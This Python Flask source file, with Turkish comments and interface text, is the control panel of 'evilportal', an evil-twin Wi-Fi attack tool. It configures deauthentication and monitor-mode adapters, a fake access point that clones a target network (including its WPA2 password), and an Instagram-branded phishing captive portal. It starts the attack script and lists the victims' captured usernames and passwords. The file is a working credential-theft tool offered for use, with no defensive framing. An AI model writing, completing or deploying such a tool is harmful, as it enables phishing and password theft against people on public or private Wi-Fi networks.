#!/usr/bin/env python3
"""evilportal — adım adım yerel web GUI.

Çalıştır:  sudo python3 gui.py
Aç:        http://127.0.0.1:8099
"""
import json
import os
import re
import signal
import subprocess
import threading

from flask import Flask, Response, jsonify, request

BASE = os.path.dirname(os.path.abspath(__file__))
CONFIG = os.path.join(BASE, "config.sh")
CREDS = os.path.join(BASE, "capture", "creds.log")
SETUP = os.path.join(BASE, "setup.sh")
PORT = 8099

LOG = []
LOG_LOCK = threading.Lock()
PROC = None
PROC_LOCK = threading.Lock()

app = Flask(__name__)


# ---------------------------------------------------------------- yardımcılar
def log_append(line: str) -> None:
    with LOG_LOCK:
        LOG.append(line)
        del LOG[:-500]


def parse_value(raw: str) -> str:
    """config.sh satır değerini yorumlardan arındırarak oku."""
    raw = raw.strip()
    if raw[:1] in ("'", '"'):
        q = raw[0]
        end = raw.find(q, 1)
        return raw[1:end] if end != -1 else raw[1:]
    return raw.split("#", 1)[0].strip()


def read_config() -> dict:
    cfg = {}
    try:
        with open(CONFIG, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                cfg[k.strip()] = parse_value(v)
    except FileNotFoundError:
        pass
    return cfg


def _clean(v) -> str:
    return str(v).replace('"', "").replace("\n", " ").replace("\r", " ")


def _trailing_comment(rest: str) -> str:
    in_q = False
    q = ""
    for i, ch in enumerate(rest):
        if in_q:
            if ch == q:
                in_q = False
        elif ch in ("'", '"'):
            in_q = True
            q = ch
        elif ch == "#":
            return rest[i:].strip()
    return ""


def write_config(vals: dict) -> None:
    with open(CONFIG, encoding="utf-8") as f:
        lines = f.read().splitlines()
    seen = set()
    for i, line in enumerate(lines):
        m = re.match(r"^([A-Z0-9_]+)=(.*)$", line)
        if not m:
            continue
        k, rest = m.group(1), m.group(2)
        if k not in vals:
            continue
        comment = _trailing_comment(rest)
        lines[i] = f'{k}="{_clean(vals[k])}"' + (f"  {comment}" if comment else "")
        seen.add(k)
    for k, v in vals.items():
        if k not in seen:
            lines.append(f'{k}="{_clean(v)}"')
    with open(CONFIG, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


def list_ifaces() -> list:
    names = []
    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True,
                             timeout=5).stdout
        names = re.findall(r"Interface (\S+)", out)
    except Exception:
        pass
    if not names:
        try:
            out = subprocess.run(["ip", "-br", "link"], capture_output=True,
                                 text=True, timeout=5).stdout
            names = [ln.split(":")[0].strip() for ln in out.splitlines() if ln.strip()]
        except Exception:
            pass
    return [n for n in names if n]


def read_creds() -> list:
    rows = []
    if not os.path.exists(CREDS):
        return rows
    try:
        with open(CREDS, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rows.append(json.loads(line))
                except json.JSONDecodeError:
                    continue
    except OSError:
        pass
    return rows


def pump(stream) -> None:
    try:
        for line in iter(stream.readline, ""):
            log_append(line.rstrip())
    finally:
        try:
            stream.close()
        except Exception:
            pass


def is_running() -> bool:
    with PROC_LOCK:
        return PROC is not None and PROC.poll() is None


# ---------------------------------------------------------------- api
@app.get("/api/interfaces")
def api_interfaces():
    return jsonify(ifaces=list_ifaces())


@app.get("/api/config")
def api_config_get():
    cfg = read_config()
    return jsonify({k: cfg.get(k) for k in (
        "MON_IF", "AP_IF", "UPLINK_IF", "SINGLE_ADAPTER",
        "TARGET_SSID", "TARGET_BSSID", "CHANNEL", "WPA_PASS",
        "PORTAL_TEMPLATE", "BRAND", "SUCCESS_URL", "SHARE_INTERNET",
    )})


@app.post("/api/config")
def api_config_set():
    vals = request.get_json(silent=True) or {}
    write_config(vals)
    log_append("[gui] config.sh güncellendi")
    return jsonify(ok=True)


@app.post("/api/start")
def api_start():
    global PROC
    with PROC_LOCK:
        if PROC is not None and PROC.poll() is None:
            return jsonify(ok=False, error="zaten çalışıyor"), 400
        vals = request.get_json(silent=True) or {}
        if vals:
            write_config(vals)
        with LOG_LOCK:
            LOG.clear()
        PROC = subprocess.Popen(
            ["bash", SETUP],
            cwd=BASE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            preexec_fn=os.setsid,
        )
        threading.Thread(target=pump, args=(PROC.stdout,), daemon=True).start()
    return jsonify(ok=True)


@app.post("/api/stop")
def api_stop():
    global PROC
    with PROC_LOCK:
        if PROC is None or PROC.poll() is not None:
            return jsonify(ok=True, message="çalışmıyor")
        try:
            os.killpg(os.getpgid(PROC.pid), signal.SIGINT)
            PROC.wait(timeout=20)
        except Exception:
            try:
                os.killpg(os.getpgid(PROC.pid), signal.SIGKILL)
            except Exception:
                pass
    return jsonify(ok=True)


@app.get("/api/status")
def api_status():
    with LOG_LOCK:
        tail = LOG[-160:]
    rows = read_creds()
    return jsonify(running=is_running(), log=tail, creds=rows[-80:],
                   count=len(rows))


@app.get("/preview/<name>")
def preview(name):
    if not re.fullmatch(r"[a-z0-9_]+", name):
        return "yok", 404
    path = os.path.join(BASE, "portal", "templates", f"{name}.html")
    if not os.path.exists(path):
        return "yok", 404
    with open(path, encoding="utf-8") as f:
        html = f.read()
    html = html.replace("{{ brand }}", "Instagram")
    html = html.replace("{{ target }}", "https://www.instagram.com/")
    return Response(html, mimetype="text/html")


@app.get("/")
def index():
    return Response(HTML, mimetype="text/html")


# ---------------------------------------------------------------- html
HTML = r"""<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>evilportal</title>
<style>
  :root{
    --bg:#0a0e17; --panel:#111827; --panel2:#0d1422; --line:#1f2a3d;
    --txt:#e6edf9; --dim:#8595b0; --acc:#e1306c; --acc2:#f77737;
    --ok:#2ecc71; --bad:#ff5c5c; --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  }
  *{box-sizing:border-box}
  body{
    margin:0;min-height:100vh;background:
      radial-gradient(900px 420px at 50% -240px,#1b2740 0%,transparent 70%),
      var(--bg);
    color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
    padding:18px;
  }
  .shell{max-width:880px;margin:0 auto}
  header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
  .brand{font-size:19px;font-weight:800;letter-spacing:-.3px;display:flex;align-items:center;gap:9px}
  .brand i{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;
    font-style:normal;font-size:15px;background:linear-gradient(135deg,var(--acc),var(--acc2))}
  .pill{padding:6px 13px;border-radius:999px;font-size:12px;font-weight:700;
    border:1px solid var(--line);color:var(--dim);background:var(--panel);white-space:nowrap}
  .pill.on{color:#0b0f19;background:var(--ok);border-color:var(--ok)}
  .pill.work{color:#0b0f19;background:#f5c542;border-color:#f5c542}
  nav.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:14px}
  .step{display:flex;align-items:center;gap:9px;padding:11px 12px;border-radius:12px;
    background:var(--panel);border:1px solid var(--line);font-size:13px;color:var(--dim);
    cursor:pointer;user-select:none;transition:.15s}
  .step b{width:22px;height:22px;border-radius:7px;display:grid;place-items:center;
    font-size:12px;background:#1b2434;color:var(--dim);flex:0 0 auto}
  .step.act{border-color:#3a4a68;color:var(--txt)}
  .step.act b{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
  .step.done b{background:var(--ok);color:#0b0f19}
  main{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:22px}
  .pane{display:none}
  .pane.on{display:block}
  h2{margin:0 0 4px;font-size:16px}
  .hint{color:var(--dim);font-size:13px;margin:0 0 18px;line-height:1.5}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:13px}
  @media(max-width:680px){.grid{grid-template-columns:1fr}nav.steps{grid-template-columns:1fr 1fr}}
  label{display:block;font-size:11.5px;color:var(--dim);margin-bottom:6px;
    text-transform:uppercase;letter-spacing:.05em;font-weight:700}
  input,select{width:100%;padding:11px 12px;border-radius:10px;border:1px solid var(--line);
    background:var(--panel2);color:var(--txt);font-size:14px;outline:none}
  input:focus,select:focus{border-color:var(--acc)}
  .field{margin-bottom:13px}
  .check{display:flex;align-items:center;gap:9px;padding:11px 12px;border-radius:10px;
    border:1px solid var(--line);background:var(--panel2);margin-bottom:13px;font-size:13.5px}
  .check input{width:17px;height:17px;accent-color:var(--acc);flex:0 0 auto}
  .nav{display:flex;justify-content:space-between;gap:10px;margin-top:20px}
  button{padding:11px 20px;border:0;border-radius:10px;cursor:pointer;font-size:14px;
    font-weight:700;background:#1b2434;color:var(--txt);transition:.15s}
  button:disabled{opacity:.4;cursor:not-allowed}
  button.primary{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff}
  button.go{background:var(--ok);color:#0b0f19}
  button.stop{background:var(--bad);color:#fff}
  button.ghost{background:transparent;border:1px solid var(--line);color:var(--dim)}
  .summary{background:var(--panel2);border:1px solid var(--line);border-radius:12px;
    padding:14px;font-family:var(--mono);font-size:12.5px;line-height:1.7;color:var(--dim);
    white-space:pre-wrap;margin-bottom:14px}
  .summary b{color:var(--txt);font-weight:600}
  pre.log{background:#060a12;border:1px solid var(--line);border-radius:12px;padding:12px;
    height:230px;overflow:auto;font-family:var(--mono);font-size:12px;line-height:1.55;
    color:#9fb2cd;white-space:pre-wrap;margin:14px 0 0}
  pre.log .ok{color:#6ee7a0}
  pre.log .err{color:#ff8a8a}
  table{width:100%;border-collapse:collapse;font-size:13px;margin-top:6px}
  th{text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.05em;
    color:var(--dim);padding:8px 10px;border-bottom:1px solid var(--line)}
  td{padding:9px 10px;border-bottom:1px solid #161f2e;vertical-align:top}
  td.p{color:#ffb3b4;font-family:var(--mono)}
  .empty{color:var(--dim);font-size:13px;padding:18px 0;text-align:center}
  .count{font-size:12px;color:var(--dim);margin-left:8px}
  .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  footer{margin-top:14px;text-align:center;font-size:11.5px;color:#5b6b85}
  code{font-family:var(--mono);background:#0d1422;padding:1px 6px;border-radius:5px}
</style>
</head>
<body>
<div class="shell">
  <header>
    <div class="brand"><i>◎</i> evilportal</div>
    <div class="pill" id="pill">durdu</div>
  </header>

  <nav class="steps" id="steps">
    <div class="step" data-s="1"><b>1</b> Arayüz</div>
    <div class="step" data-s="2"><b>2</b> Hedef</div>
    <div class="step" data-s="3"><b>3</b> Başlat</div>
    <div class="step" data-s="4"><b>4</b> Kayıtlar</div>
  </nav>

  <main>
    <!-- 1 -->
    <section class="pane on" data-s="1">
      <h2>Adaptörler</h2>
      <p class="hint">Deauth için monitor mode destekli kart, sahte AP için ikinci kart.
        Tek kartla deneyeceksen aşağıdaki seçeneği işaretle.</p>
      <div class="grid">
        <div class="field"><label>Monitor arayüzü (deauth)</label>
          <select id="MON_IF"></select></div>
        <div class="field"><label>AP arayüzü (sahte ağ)</label>
          <select id="AP_IF"></select></div>
        <div class="field"><label>Uplink (internet)</label>
          <select id="UPLINK_IF"><option value="">otomatik</option></select></div>
        <div class="field"><label>&nbsp;</label>
          <label class="check"><input type="checkbox" id="SINGLE_ADAPTER"> Tek adaptör modu</label>
        </div>
      </div>
      <div class="nav">
        <span></span>
        <button class="primary" onclick="go(2)">İleri →</button>
      </div>
    </section>

    <!-- 2 -->
    <section class="pane" data-s="2">
      <h2>Hedef ağ</h2>
      <p class="hint">Hedef WPA2-PSK ise parolasını girmen gerekir; yoksa istemci sahte ağa
        bağlanmaz. Açık ağlarda boş bırak.</p>
      <div class="grid">
        <div class="field"><label>SSID</label>
          <input id="TARGET_SSID" placeholder="KafeWiFi"></div>
        <div class="field"><label>BSSID</label>
          <input id="TARGET_BSSID" placeholder="AA:BB:CC:DD:EE:FF"></div>
        <div class="field"><label>Kanal</label>
          <input id="CHANNEL" type="number" min="1" max="196" placeholder="6"></div>
        <div class="field"><label>WPA2 parolası (varsa)</label>
          <input id="WPA_PASS" placeholder="boş = açık ağ"></div>
        <div class="field"><label>Portal sayfası</label>
          <select id="PORTAL_TEMPLATE">
            <option value="instagram">Instagram — şüpheli aktivite</option>
            <option value="verify">Genel — hesap doğrulama</option>
          </select></div>
        <div class="field"><label>Doğrulama sonrası yönlendirme</label>
          <input id="SUCCESS_URL" placeholder="https://www.google.com"></div>
      </div>
      <label class="check"><input type="checkbox" id="SHARE_INTERNET">
        Doğrulama sonrası gerçek internet ver</label>
      <div class="row">
        <button class="ghost" onclick="preview()">Portalı önizle</button>
      </div>
      <div class="nav">
        <button onclick="go(1)">← Geri</button>
        <button class="primary" onclick="go(3)">İleri →</button>
      </div>
    </section>

    <!-- 3 -->
    <section class="pane" data-s="3">
      <h2>Başlat</h2>
      <p class="hint">Ayarlar <code>config.sh</code>'e yazılır ve sistem ayağa kaldırılır.
        Durdurduğunda iptables, hostapd, dnsmasq ve NetworkManager geri alınır.</p>
      <div class="summary" id="summary"></div>
      <div class="row">
        <button class="go" id="btnStart" onclick="start()">▶ Başlat</button>
        <button class="stop" id="btnStop" onclick="stop()" disabled>■ Durdur</button>
      </div>
      <pre class="log" id="log">hazır.</pre>
      <div class="nav">
        <button onclick="go(2)">← Geri</button>
        <button class="primary" onclick="go(4)">Kayıtlar →</button>
      </div>
    </section>

    <!-- 4 -->
    <section class="pane" data-s="4">
      <h2>Yakalananlar <span class="count" id="count">0</span></h2>
      <p class="hint">Form gönderen istemcilerin bilgileri. Kayıtlar
        <code>capture/creds.log</code> dosyasında JSON satırları olarak tutulur.</p>
      <div id="creds"><div class="empty">henüz kayıt yok</div></div>
      <div class="nav">
        <button onclick="go(3)">← Geri</button>
        <span></span>
      </div>
    </section>
  </main>

  <footer>127.0.0.1:8099 · yerel yönetim paneli</footer>
</div>

<script>
const $ = id => document.getElementById(id);
let step = 1, running = false;

const FIELDS = ["MON_IF","AP_IF","UPLINK_IF","TARGET_SSID","TARGET_BSSID",
                "CHANNEL","WPA_PASS","PORTAL_TEMPLATE","SUCCESS_URL"];

function go(n){
  step = n;
  document.querySelectorAll(".pane").forEach(p =>
    p.classList.toggle("on", +p.dataset.s === n));
  document.querySelectorAll(".step").forEach(s => {
    const v = +s.dataset.s;
    s.classList.toggle("act", v === n);
    s.classList.toggle("done", v < n);
  });
  if (n === 3) refreshSummary();
  if (n === 4) poll();
}

function collect(){
  const o = {};
  FIELDS.forEach(k => { const el = $(k); if (el) o[k] = el.value.trim(); });
  o.SINGLE_ADAPTER = $("SINGLE_ADAPTER").checked ? "1" : "0";
  o.SHARE_INTERNET = $("SHARE_INTERNET").checked ? "1" : "0";
  return o;
}

function refreshSummary(){
  const o = collect();
  $("summary").innerHTML =
    "<b>SSID</b>      " + (o.TARGET_SSID || "—") + "\n" +
    "<b>BSSID</b>     " + (o.TARGET_BSSID || "—") + "\n" +
    "<b>Kanal</b>     " + (o.CHANNEL || "—") + "\n" +
    "<b>WPA</b>       " + (o.WPA_PASS ? "var" : "yok (açık)") + "\n" +
    "<b>Monitor</b>   " + (o.MON_IF || "—") + "\n" +
    "<b>AP</b>        " + (o.AP_IF || "—") + "\n" +
    "<b>Portal</b>    " + (o.PORTAL_TEMPLATE || "—") + "\n" +
    "<b>İnternet</b>  " + (o.SHARE_INTERNET === "1" ? "açık" : "kapalı");
}

async function load(){
  const [ifs, cfg] = await Promise.all([
    fetch("/api/interfaces").then(r => r.json()),
    fetch("/api/config").then(r => r.json())
  ]);
  const list = ifs.ifaces || [];
  ["MON_IF","AP_IF","UPLINK_IF"].forEach(id => {
    const sel = $(id);
    sel.innerHTML = id === "UPLINK_IF" ? '<option value="">otomatik</option>' : "";
    list.forEach(n => {
      const o = document.createElement("option");
      o.value = o.textContent = n;
      sel.appendChild(o);
    });
  });
  ["MON_IF","AP_IF","UPLINK_IF","TARGET_SSID","TARGET_BSSID","CHANNEL",
   "WPA_PASS","PORTAL_TEMPLATE","SUCCESS_URL"].forEach(k => {
    const el = $(k);
    if (el && cfg[k] !== undefined && cfg[k] !== null) el.value = cfg[k];
  });
  $("SINGLE_ADAPTER").checked = cfg.SINGLE_ADAPTER === "1";
  $("SHARE_INTERNET").checked = cfg.SHARE_INTERNET !== "0";
}

async function start(){
  $("btnStart").disabled = true;
  $("log").textContent = "başlatılıyor…\n";
  const r = await fetch("/api/start", {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify(collect())
  }).then(r => r.json()).catch(e => ({ok:false, error:String(e)}));
  if (!r.ok) { $("log").textContent += "HATA: " + (r.error||"bilinmiyor"); }
  poll();
}

async function stop(){
  $("btnStop").disabled = true;
  await fetch("/api/stop", {method:"POST"});
  poll();
}

function colorize(line){
  if (/\[\+\]/.test(line)) return '<span class="ok">' + esc(line) + '</span>';
  if (/\[-\]|error|Error|fail|Fail|HATA/.test(line)) return '<span class="err">' + esc(line) + '</span>';
  return esc(line);
}
function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;"); }

function renderCreds(rows){
  $("count").textContent = rows.length ? rows.length : 0;
  if (!rows.length){ $("creds").innerHTML = '<div class="empty">henüz kayıt yok</div>'; return; }
  let h = "<table><tr><th>Zaman</th><th>IP</th><th>Kullanıcı</th><th>Şifre</th></tr>";
  rows.slice().reverse().forEach(r => {
    h += "<tr><td>" + esc(r.ts||"") + "</td><td>" + esc(r.ip||"") +
         "</td><td>" + esc(r.username||"") + "</td><td class='p'>" +
         esc(r.password||"") + "</td></tr>";
  });
  $("creds").innerHTML = h + "</table>";
}

async function poll(){
  const s = await fetch("/api/status").then(r => r.json()).catch(() => null);
  if (!s) return;
  running = s.running;
  const pill = $("pill");
  pill.className = "pill " + (running ? "on" : "");
  pill.textContent = running ? "çalışıyor" : "durdu";
  $("btnStart").disabled = running;
  $("btnStop").disabled = !running;

  const logEl = $("log");
  const atBottom = logEl.scrollTop + logEl.clientHeight >= logEl.scrollHeight - 30;
  logEl.innerHTML = (s.log || []).map(colorize).join("\n") || "hazır.";
  if (atBottom) logEl.scrollTop = logEl.scrollHeight;

  renderCreds(s.creds || []);
}

function preview(){
  const t = $("PORTAL_TEMPLATE").value || "instagram";
  window.open("/preview/" + t, "_blank");
}

document.querySelectorAll(".step").forEach(s =>
  s.addEventListener("click", () => go(+s.dataset.s)));

load();
setInterval(poll, 1500);
</script>
</body>
</html>
"""

if __name__ == "__main__":
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("[!] root değil — 'Başlat' adımı başarısız olur. sudo python3 gui.py")
    print(f"[*] GUI: http://127.0.0.1:{PORT}")
    app.run(host="127.0.0.1", port=PORT, threaded=True)
